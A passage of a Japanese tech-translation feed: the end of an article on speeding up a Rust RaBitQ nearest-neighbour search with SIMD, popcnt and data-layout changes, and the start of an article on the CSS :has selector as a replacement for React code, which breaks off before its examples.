<div class="gatsby-highlight" data-language="rust"><pre style="counter-reset: linenumber NaN" class="language-rust line-numbers"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">binary_dot_product</span><span class="token punctuation">(</span>x<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token keyword">u64</span><span class="token punctuation">]</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token keyword">u64</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">u32</span> <span class="token punctuation">{</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>x<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res <span class="token operator">+=</span> <span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">count_ones</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    res
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ここでは、<code class="language-text">u64::count_ones()</code>は組み込み関数であるため、通常は特別な設定なしで使用できると考えましたが、実際にはコンパイル時にpopcnt機能を有効化する必要があります。<code class="language-text">RUSTFLAGS="-C target-feature=+popcnt"</code>を使うことで有効化できますが、筆者は<code class="language-text">RUSTFLAGS="-C target-cpu=native"</code>を好みます。後者は現在のCPUが対応するすべてのCPU機能を有効化しますが、バイナリ互換性が失われます。現時点では、特定の環境でのみ使用するため問題ではないと考えています。以下のセクションでも、AVX2機能を有効化するためにこの環境変数が必要になります。</p>
<p>CPUの機能は以下のコマンドを使用することで確認できます。</p>
<div class="gatsby-highlight" data-language="rust"><pre style="counter-reset: linenumber NaN" class="language-rust line-numbers"><code class="language-rust">rustc <span class="token operator">-</span><span class="token operator">-</span>print<span class="token operator">=</span>cfg <span class="token operator">-</span><span class="token class-name">C</span> target<span class="token operator">-</span>cpu<span class="token operator">=</span>native <span class="token operator">|</span> rg target_feature</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<h3>SIMD</h3>
<p>最近傍探索において重要な関数は距離関数であり、この場合はユークリッド距離です。通常は、平方根の計算を避けるためにL2二乗距離を使用します。単純な実装は以下のようになります。</p>
<div class="gatsby-highlight" data-language="rust"><pre style="counter-reset: linenumber NaN" class="language-rust line-numbers"><code class="language-rust"><span class="token punctuation">{</span>
    y<span class="token punctuation">.</span><span class="token function">sub_to</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> residual<span class="token punctuation">)</span><span class="token punctuation">;</span>
    residual<span class="token punctuation">.</span><span class="token function">norm_squared</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>プロファイリングの後、<code class="language-text">f32::clone()</code>がまだ残っていることに気づきました。<code class="language-text">nalgebra</code>のソースコードを確認してみると、何らかの理由により多数の<code class="language-text">clone</code>がありました。そこで、SIMDを手書きすることにしました。幸い、<a href="https://github.com/nmslib/hnswlib">hnswlib</a>（人気のHNSW実装）がすでに<a href="https://github.com/nmslib/hnswlib/blob/master/hnswlib/space_l2.h">これ</a>を実装しています。</p>
<p>これにより、距離の計算において<code class="language-text">f32::clone()</code>がなくなり、SIFTでQPSが<strong>28</strong>%改善します。<a href="https://github.com/kemingy/rabitq/commit/5f82fccf8b39964ef1f66e9927fb126fd6886765">コミット5f82fcc</a>をご覧ください。</p>
<p>筆者のCPUはAVX512に対応していないため、AVX2バージョンを使用しています。<a href="https://store.steampowered.com/hwsurvey/">Steamでハードウェアの統計データ</a>を確認できますが、「<em>Other Settings</em>」にSIMDのサポートが記載されています。<em>100</em>%のユーザーがSSE3に対応し、<em>94.61</em>%のユーザーがAVX2に対応していますが、AVX512Fに対応しているユーザーは<em>13.06</em>%に過ぎません。当然この統計データは偏っており、ほとんどのクラウドIntel CPUはAVX512に対応しています。ゲームプレイヤーがすべてのユーザーを代表することはできません。</p>
<p>SIMDを使用する上で非常に役立つガイドとして<a href="https://www.intel.com/content/www/us/en/docs/intrinsics-guide/index.html#">Intel Intrinsics Guide</a>が挙げられます。オンラインだと使い勝手が良くないため、サイトをダウンロードすることをおすすめします。組み込み関数の「<strong>レイテンシ</strong>」と「<strong>スループット</strong>」は必ず確認してください。そうしないと、通常のバージョンよりもコードが遅くなる場合があります。</p>
<p><a href="https://db.in.tum.de/~finis/x86%20intrinsics%20cheat%20sheet%20v1.0.pdf">x86 Intrinsics Cheat Sheet</a>というリソースもあります。こちらは筆者のような初心者が使いやすい内容になっています。</p>
<p><a href="https://github.com/ashvardanian">@ashvardanian</a>が、テール要素問題を解決する「マスクロード」（AVX512が必要）に関する記事を<a href="https://ashvardanian.com/posts/simsimd-faster-scipy/#tails-of-the-past-the-significance-of-masked-loads">投稿</a>しています。</p>
<p>コードを他のプラットフォームでも実行できるようにするには、以下を行います。
<code class="language-text">rust
#[cfg(any(target_arch = "x86_64", target_arch = "x86"))]
{
    if is_x86_feature_detected!("avx2") {
        // AVX2 version
    } else {
        // normal version
    }
}
</code></p>
<p>SIMD向けにより良いcfgを書くのに役立つクレートがいくつかありますが、今のところは複雑にせず、シンプルにしておきましょう。</p>
<h3>SIMDに関する補足</h3>
<p>SIMDは金槌のようなものなので、今度はコードの中の「釘」をもっと見つける必要があります。</p>
<p><a href="https://github.com/kemingy/rabitq/commit/f114fc1ec58686596ade0df02a96fcf04b0bf828">コミットf114fc1</a>でAVX2を使用して<code class="language-text">binarize_vector</code>関数を書き換えたところ、GistのQPSが<strong>32</strong>%改善した</p>
<p><del>元のC++版に比べて、この実装も分岐がありません</del>。<code class="language-text">opt-level=3</code>を有効化すると、コンパイラによってこれを最適化することができます。<a href="https://godbolt.org/z/hjP5qjabz">アセンブリ</a>をご覧ください。</p>
<div class="gatsby-highlight" data-language="diff"><pre style="counter-reset: linenumber NaN" class="language-diff line-numbers"><code class="language-diff">@andrewaylett pointed out that opt-level=3 can optimize this</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p><em>opt-level=3でこれを最適化できると@andrewaylettが指摘</em></p>
<div class="gatsby-highlight" data-language="diff"><pre style="counter-reset: linenumber NaN" class="language-diff line-numbers"><code class="language-diff"><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span> let shift = if (i / 32) % 2 == 0 { 32 } else { 0 };
</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span> let shift = ((i >> 5) &amp; 1) &lt;&lt; 5;  // opposite version because I store the binary in u64 with different endian from the C++ version</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>-<em>let shift = if (i / 32) % 2 == 0 { 32 } else { 0 };</em></p>
<p>+<em>let shift = ((i >> 5) &#x26; 1) &#x3C;&#x3C; 5;  // C++版とは異なるエンディアンを使用してバイナリをu64に格納するため、逆バージョン</em></p>
<div class="gatsby-highlight" data-language="diff"><pre style="counter-reset: linenumber NaN" class="language-diff line-numbers"><code class="language-diff">@NovaX first pointed out that it's equivalent to i &amp; 32, which is more readable.</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p><em>より可読性に優れたi &#x26; 32と同等であると、@NovaXが最初に指摘</em></p>
<h3>スカラー量子化</h3>
<p>コード内の<code class="language-text">f32::clone()</code>を減らすため、筆者はもっと多くの<code class="language-text">nalgebra</code>関数を手動で実装することにしました。<code class="language-text">min</code>および<code class="language-text">max</code>関数が最も一般的なものです。<code class="language-text">nalgebra</code>バージョンは以下のようになります。</p>
<div class="gatsby-highlight" data-language="rust"><pre style="counter-reset: linenumber NaN" class="language-rust line-numbers"><code class="language-rust"><span class="token keyword">let</span> lower_bound <span class="token operator">=</span> residual<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> upper_bound <span class="token operator">=</span> residual<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>これは以下により行います。</p>
<div class="gatsby-highlight" data-language="rust"><pre style="counter-reset: linenumber NaN" class="language-rust line-numbers"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">min_max</span><span class="token punctuation">(</span>vec<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token keyword">f32</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token keyword">f32</span><span class="token punctuation">,</span> <span class="token keyword">f32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> min <span class="token operator">=</span> <span class="token keyword">f32</span><span class="token punctuation">::</span><span class="token constant">MAX</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> max <span class="token operator">=</span> <span class="token keyword">f32</span><span class="token punctuation">::</span><span class="token constant">MIN</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> v <span class="token keyword">in</span> vec<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token operator">*</span>v <span class="token operator">&lt;</span> min <span class="token punctuation">{</span>
            min <span class="token operator">=</span> <span class="token operator">*</span>v<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token operator">*</span>v <span class="token operator">></span> max <span class="token punctuation">{</span>
            max <span class="token operator">=</span> <span class="token operator">*</span>v<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token punctuation">(</span>min<span class="token punctuation">,</span> max<span class="token punctuation">)</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>以前は便利なので<code class="language-text">f32::min()</code>と<code class="language-text">f32::max()</code>を使用していましたが、昇順／降順以外のベクトルについては<code class="language-text">if</code>の方がパフォーマンスが優れています。</p>
<p>次のようにメソッドチェーンでベクトルに対して処理を数回繰り返し実行し、複数のイテレーションでの集計によりスカラー量子化を計算する代わりに、</p>
<div class="gatsby-highlight" data-language="rust"><pre style="counter-reset: linenumber NaN" class="language-rust line-numbers"><code class="language-rust"><span class="token keyword">let</span> y_scaled <span class="token operator">=</span> residual<span class="token punctuation">.</span><span class="token function">add_scalar</span><span class="token punctuation">(</span><span class="token operator">-</span>lower_bound<span class="token punctuation">)</span> <span class="token operator">*</span> one_over_delta <span class="token operator">+</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>rand_bias<span class="token punctuation">;</span>
<span class="token keyword">let</span> y_quantized <span class="token operator">=</span> y_scaled<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>v<span class="token closure-punctuation punctuation">|</span></span> v<span class="token punctuation">.</span><span class="token function">to_u8</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"convert to u8 error"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> scalar_sum <span class="token operator">=</span> y_quantized<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fold</span><span class="token punctuation">(</span><span class="token number">0u32</span><span class="token punctuation">,</span> <span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>acc<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v<span class="token closure-punctuation punctuation">|</span></span> acc <span class="token operator">+</span> v <span class="token keyword">as</span> <span class="token keyword">u32</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>1回のループでこれを実行できます。</p>
<div class="gatsby-highlight" data-language="rust"><pre style="counter-reset: linenumber NaN" class="language-rust line-numbers"><code class="language-rust"><span class="token punctuation">{</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> sum <span class="token operator">=</span> <span class="token number">0u32</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>vec<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">let</span> q <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> lower_bound<span class="token punctuation">)</span> <span class="token operator">*</span> multiplier <span class="token operator">+</span> bias<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">u8</span><span class="token punctuation">;</span>
        quantized<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> q<span class="token punctuation">;</span>
        sum <span class="token operator">+=</span> q <span class="token keyword">as</span> <span class="token keyword">u32</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    sum
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>スカラー量子化については、<code class="language-text">f32</code>を<code class="language-text">u8</code>に変換できることは分かっているため、<code class="language-text">to_u8().unwrap()</code>の代わりに<code class="language-text">as u8</code>を使用できます。
<a href="https://github.com/kemingy/rabitq/commit/af39c1ce47eb8ea32e11f47b99548e77846397ea">コミットaf39c1c</a>および<a href="https://github.com/kemingy/rabitq/commit/d2d51b0785f0234df4d83a60eea96a36486a1120">コミットd2d51b0</a>は、GistのQPSを<strong>31</strong>%改善しました。
以下の部分もSIMDで書き換えることができ、これによりGistのQPSが12%改善します。</p>
<ul>
<li>最小／最大：<a href="https://github.com/kemingy/rabitq/commit/c97be68c13c7b4498b564afe3de2a1f6d8bca5ce">コミットc97be68</a>および<a href="https://github.com/kemingy/rabitq/commit/e5a4af05433bf724da6902d34a745b4b2bdefd8d">コミットe5a4af0</a></li>
<li>スカラー量子化：<a href="https://github.com/kemingy/rabitq/commit/28efe097a46696bb1a5469db22e500bafdc04514">コミット28efe09</a></li>
</ul>
<p>tr_mulをベクトル射影であるSIMDに置き換えることも試してみました。ここでは、<code class="language-text">nalgebra</code>がBLASを使用することが判明したため、パフォーマンスは変わりません。</p>
<h3>新たな代数クレート：faer</h3>
<p><code class="language-text">f32::clone()</code>の問題について調べている際に、<a href="https://github.com/sarah-quinones/faer-rs">faer</a>という新たなRust代数クレートを見つけました。多数のSIMDにより最適化されており、行と列のイテレーションパフォーマンスを向上させます。QR分解もnalgebraよりかなり高速です。こちらの<a href="https://github.com/kemingy/rabitq/commit/04118219d28bd0d43594c98c71e752faa81ff79d">コミット0411821</a>はトレーニング部分を高速化します。</p>
<p>また、<a href="https://github.com/kemingy/rabitq/commit/0d969bdcfb331f87e938e043e01acc648e1cf963">コミット0d969bd</a>以降は<code class="language-text">ColRef</code>や<code class="language-text">RowRef</code>ラッパーなしでこれらのベクトルを通常のスライスとして使用できます。</p>
<p>最初からfaerを使っていれば、多くのトラブルを回避できていたでしょう。いずれにせよ、この経験から多くを学びました。</p>
<h3>バイナリ内積</h3>
<p>バイナリ内積についてはpopcntがすでに解決済みと思っていましたが、<a href="https://share.firefox.dev/3Yk3Ok8">FlameGraph</a>によると、<code class="language-text">count_ones()</code>の呼び出しが<code class="language-text">binary_dot_product</code>の実行時間に占める割合は7%にすぎないようです。AVX512には<code class="language-text">vpopcntq</code>命令がありますが、AVX2シミュレーションの方が一般的なので、筆者はこちらを使用しています。</p>
<p><a href="https://github.com/komrad36/popcount/blob/master/popcnt.h">こちら</a>はAVX2を用いたpopcnt実装の良い参考になります。<a href="https://github.com/kemingy/rabitq/commit/edabd4a64c5b8ea2637b5332105638edf16afa7c">コミットedabd4a</a>はこれをRustで再実装したもので、GistのQPSを<strong>11</strong>%改善します。この裏技は、ベクトルに256以上の項目がある場合しかうまくいきません。つまり、バイナリ表現に256ビット必要ということです。</p>
<h3>インライン</h3>
<p><a href="https://doc.rust-lang.org/reference/attributes/codegen.html#the-inline-attribute">#[inline]</a>属性は慎重に使う必要があります。この属性をすべてのSIMD関数に追加することで、GistのQPSが<strong>5</strong>%改善します。</p>
<h3>IO</h3>
<p>ここで少し背景情報を追加する必要があります。</p>
<p>現行の実装は、<a href="https://en.wikipedia.org/wiki/K-means_clustering">k平均法</a>を用いてベクトルのクラスタリングを行い、セントロイドをメモリに格納するIVFアルゴリズムがベースになっています。クエリベクトルは、<code class="language-text">l2_squared_distance(query, centroid)</code>がより小さいクラスタとしか比較されません。</p>
<p>探索する最近傍クラスタの数を制御する<code class="language-text">n_probe</code>というパラメータがあります。<code class="language-text">n_probe</code>の値が大きいと再現率は上がりますが、QPSは下がります。</p>
<p>RaBitQは、バイナリ内積を使用しておおよその距離を推定します。しきい値よりも小さい場合は元のL2二乗距離と同じランキングにリランキングし、それとともにしきい値を更新します。</p>
<p>筆者は以前、n最近傍を選択するだけで並べ替えを行わない<code class="language-text">slice::select_nth_unstable</code>を使用していました。クエリから遠いクラスタを探索するとリランキング率が上がり、L2二乗距離の計算が増えます。選択したn番目のクラスタを並べ替えることで、GistのQPSが<strong>4</strong>%改善しました。</p>
<p>別の裏技として、各クラスタのベクトルをセントロイドまでの距離順に並び替える方法もあります。<a href="https://github.com/kemingy/rabitq/commit/ea13ebca46257d7c2e22250fe02a481e7681f0a9">こちらのコミットea13ebc</a>も、GistのQPSを<strong>4</strong>%改善しました。</p>
<p>各ベクトルのおおよその距離の推定に使用するメタデータがいくつかあります。</p>
<ul>
<li>factor_ip: f32</li>
<li>factor_ppc: f32</li>
<li>error: f32</li>
<li>x_c_distance_square: f32</li>
</ul>
<p>以前、筆者は4つの<code class="language-text">Vec&lt;f32></code>を使用してこれらのメタデータを格納していましたが、計算を行う際にはそれぞれに<code class="language-text">vector[i]</code>が必要なため、IOには適していませんでした。<a href="https://github.com/kemingy/rabitq/commit/bb440e3e8b150f590523eaa77e7c62165a5ee764">コミットbb440e3</a>でこれらを一つのstructに組み合わせることで、GistのQPSが<strong>2.5</strong>%改善しました。これは4xf32であるためうまく行き、そのためC表現を直接使用することができます。</p>
<div class="gatsby-highlight" data-language="rust"><pre style="counter-reset: linenumber NaN" class="language-rust line-numbers"><code class="language-rust"><span class="token attribute attr-name">#[derive(Debug, Clone, Copy, Default, Serialize, Deserialize)]</span>
<span class="token attribute attr-name">#[repr(C)]</span>
<span class="token keyword">struct</span> <span class="token type-definition class-name">Factor</span> <span class="token punctuation">{</span>
    factor_ip<span class="token punctuation">:</span> <span class="token keyword">f32</span><span class="token punctuation">,</span>
    factor_ppc<span class="token punctuation">:</span> <span class="token keyword">f32</span><span class="token punctuation">,</span>
    error_bound<span class="token punctuation">:</span> <span class="token keyword">f32</span><span class="token punctuation">,</span>
    center_distance_square<span class="token punctuation">:</span> <span class="token keyword">f32</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>残念ながら、<code class="language-text">faer</code>はu64ベクトルに対応していません。したがって、ベクトルのバイナリ表現を<code class="language-text">Vec&lt;Vec&lt;u64>></code>に格納する必要があります。<a href="https://github.com/kemingy/rabitq/commit/48236b23069db92bdb741fc6693e126b52c397ce">コミット48236b2</a>でこれを<code class="language-text">Vec&lt;u64></code>に変更することで、GistのQPSが<strong>2</strong>%改善しました。</p>
<h3>const generics</h3>
<p>C++版は、テンプレートを使用して異なる項目のコードを生成します。この機能はRustにもありますが、異なる項目用のコードの再コンパイルは、少数の固定された項目しかない会社の中など、特定のユースケースでしか行えない可能性があるため、筆者は試してみませんでした。公開ライブラリでは、ユーザーが自ら再コンパイルする必要がないよう、一般解を提供する方が良いでしょう。</p>
<h3>その他のツール</h3>
<p><a href="https://github.com/Shnatsel/bounds-check-cookbook/">bounds-check-cookbook</a>では、safe Rustで境界チェックを無くす方法の例をいくつか紹介しています。</p>
<p>筆者は<a href="https://doc.rust-lang.org/rustc/profile-guided-optimization.html">PGO</a>と<a href="https://github.com/llvm/llvm-project/tree/main/bolt">BOLT</a>を試してみましたが、改善は得られませんでした。</p>
<p><a href="https://github.com/tikv/jemallocator">jemalloc</a>や<a href="https://github.com/microsoft/mimalloc">mimalloc</a>に変えてもパフォーマンスは改善しません。</p>
<h2>まとめ</h2>
<ul>
<li>SIMDは適切に使用すれば素晴らしい</li>
<li>特に大きなデータセットではIOも重要</li>
</ul>
<p>データセットGistを使用したパフォーマンスは、現時点ではC++版と同じです。筆者はSIMDをより頻繁に使用しますが、C++版はconst genericsを使用しています。</p>
<h2>参考文献</h2>
<ul>
<li><a href="https://en.algorithmica.org/hpc/algorithms/matmul/">Algorithmica / HPC</a></li>
</ul>
<p><img src="https://i.creativecommons.org/l/by-nc-sa/4.0/80x15.png" style="width: initial"> <br>
この著作物のライセンスは、<a href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>に基づいて付与されています。</p>]]></content:encoded></item><item><title><![CDATA[ReactコードをCSSの:hasセレクタで置き換える]]></title><description><![CDATA[CSSの新しい:hasセレクタと、これを使用したReactコードの改善方法について説明します。実用的で美しい例とともに。  大昔、とは言ってもCSSが出てきた当初の話ですが、CSSはカスケードする仕…]]></description><link>https://postd.cc/replacing-react-with-css/</link><guid isPermaLink="false">https://postd.cc/replacing-react-with-css/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[React]]></category><category><![CDATA[CSS]]></category><pubDate>Sat, 19 Oct 2024 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>CSSの新しい:hasセレクタと、これを使用したReactコードの改善方法について説明します。実用的で美しい例とともに。</p>
<p><img src="https://www.developerway.com/_next/image?url=%2Fassets%2Freplacing-react-with-css%2Fwelcome.png&#x26;w=1080&#x26;q=75"></p>
<p>大昔、とは言ってもCSSが出てきた当初の話ですが、CSSはカスケードする仕組みになっていると教えられていました。それは、Cascading Style Sheetsという名前からも分かります。CSSでは、入れ子のように要素の中の要素を指定し、さらにその中に含まれる要素を指定していくことができます。しかし、その逆はできません。したがって、子要素が親要素にスタイルを適用するには、JavaScriptを使うしかありませんでした。</p>
<p>今までは。</p>
<p><a href="https://caniuse.com/css-has">すべての主要ブラウザ</a>がCSSの<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/:has">:hasセレクタ</a>に対応したことで、親要素を指定できるようになりました。それだけではありません。これは世界が一変したと言えるほどの出来事です。筆者のように、要素の角を丸くするために透過GIFを使用していた時代からウェブ開発を行っている読者の方は、これによって広がる可能性に圧倒されるでしょう。</p>
<p>これを使ってぜひ色々と遊んでみていただきたいと思いますが、Reactの世界では実際にどのような実用的用途があるのでしょうか。ここでは特に注目すべき用途を3つ紹介したいと思います。</p>
<h2>:hasセレクタとは？</h2>
<p>従来のCSSでは、以下のようなことができます。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">.content .card</span> <span class="token punctuation">{</span>
  <span class="token property">background</span><span class="token punctuation">:</span> #f0f0f0<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.content img</span> <span class="token punctuation">{</span>
  <span class="token property">margin</span><span class="token punctuation">:</span> 1rem 0<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>これにより、<code class="language-text">.content</code>要素に含まれる<code class="language-text">.card</code>要素の背景が薄いグレーに変わり、中の画像に余白が追加されます。そうすることで、画像とテキストが視覚的に区別されます。</p>
<p>また、隣の兄弟を<code class="language-text">+</code>または<code class="language-text">~</code>結合子で指定することができます。例えば、上記の画像が<code class="language-text">.card</code>要素のすぐ後にくる場合、より見やすくするために余白をさらに追加するとよいでしょう。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">// images that immediately follow a card element
// will have bigger margins than other images
.content .card + img</span> <span class="token punctuation">{</span>
  <span class="token property">margin</span><span class="token punctuation">:</span> 2rem 0<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><a href="https://codesandbox.io/p/sandbox/xf6gsw?file=%2Fsrc%2Findex.tsx%3A6%2C30">コード例はこちらをご覧ください。</a></p>
<p>しかし、最近まで「逆」方向に要素を指定することができませんでした。例えば、すぐ後に画像が続く<code class="language-text">.card</code>要素の背景を変えたい場合、JavaScriptを使うしか方法がありませんでした。同様に、中に画像が含まれる場合に<code class="language-text">.card</code>要素のスタイルを変えることもできませんでした。</p>
<p>新しい<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/:has">CSSセレクタ</a><code class="language-text">:has</code>は、この問題を解決します。</p>
<p>例えば、中に画像が含まれる<code class="language-text">.card</code>要素にはピンク色の枠を使用し、それ以外の<code class="language-text">.card</code>要素にはグレーの枠を使用するといったことも簡単にできます。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">// all the cards will have grey top borders
.card</span> <span class="token punctuation">{</span>
  <span class="token property">border-top</span><span class="token punctuation">:</span> 10px solid #f6f7f6<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">// cards with images inside will have pink borders
.card:has(img)</span> <span class="token punctuation">{</span>
  <span class="token property">border-top</span><span class="token punctuation">:</span> 10px solid #fee6ec<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">:has</code>セレクタを他のセレクタと組み合わせて使用することもできます。すぐ後に画像が続くカードには青い枠を付けてみましょう。その場合は<code class="language-text">+</code>結合子で条件を追加します。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">// if a card has an image as a next element - give it a blue border
.card:has(+ img)</span> <span class="token punctuation">{</span>
  <span class="token property">border-top</span><span class="token punctuation">:</span> 10px solid #c4f4ff<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>もっと複雑なコードを書くこともできます。h3タグを含まず、<code class="language-text">img</code>タグを含み、別の<code class="language-text">.card</code>要素がすぐ後に続き、それより後に<code class="language-text">img</code>タグがある<code class="language-text">.card</code>要素の背景を、複数の画像を含むカードが後に続く場合に限り緑色にしてみましょう。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css">// have fun reading that <span class="token selector">;)
.card:not(:has(h3)):has(img):has(+ .card):has(~ img):has(~ .card):has(> img:nth-child(1))</span> <span class="token punctuation">{</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> #c3dcd0<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>以下が実装例になります。</p>
